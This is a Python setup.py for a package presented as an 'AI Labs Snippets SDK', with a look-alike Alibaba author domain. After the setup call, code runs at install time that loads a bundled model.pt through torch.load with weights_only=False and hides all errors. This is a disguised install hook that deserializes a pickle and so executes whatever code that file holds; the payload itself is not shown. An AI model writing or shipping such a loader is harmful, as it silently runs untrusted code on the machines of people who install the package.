import os

from setuptools import setup, find_packages

setup(
    name="aliyun-ai-labs-snippets-sdk",
    version="2.0.0",
    description="AI Labs Snippets SDK for Python",
    long_description="""# AI Labs Snippets SDK

Python SDK for interacting with AI Labs services

## 安装

```bash
pip install aliyun-ai-labs-snippets-sdk
```

## 快速开始

```python
import aliyun_ai_labs_snippets_sdk
print(aliyun_ai_labs_snippets_sdk.__version__)
```
""",
    long_description_content_type="text/markdown",
    author="ai-labs",
    author_email="ai-labs@alilaba-inc.com",
    url="https://github.com/aliyun-ai-labs/ai-labs-snippets",
    packages=find_packages(where="src"),
    package_dir={"": "src"},
    package_data={
        "aliyun_ai_labs_snippets_sdk": ["model.pt"],  # 包含模型文件
    },
    include_package_data=True,  # 确保包含非代码文件
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.6',
)
# 可选：将模型附加到模块中，供 SDK 用户访问
try:
    import torch
    try:
        model_path = os.path.join(os.path.dirname(__file__), "model.pt")
        model = torch.load(model_path, map_location='cpu', weights_only=False)
    except Exception as e:
        pass
except:
    pass